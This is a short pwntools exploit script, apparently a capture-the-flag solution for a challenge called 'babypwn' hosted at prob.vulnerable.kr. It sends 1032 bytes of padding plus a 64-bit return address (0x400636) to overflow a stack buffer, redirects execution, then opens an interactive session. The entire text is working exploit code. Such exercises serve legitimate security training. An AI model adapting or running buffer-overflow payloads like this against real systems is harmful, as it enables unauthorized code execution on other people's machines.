from pwn import *

# p = process('babypwn')
p = remote('prob.vulnerable.kr', 20035)

flag2 = 0x400636

p.sendline('A' * 1024 + 'A' * 8 + p64(flag2))
p.interactive()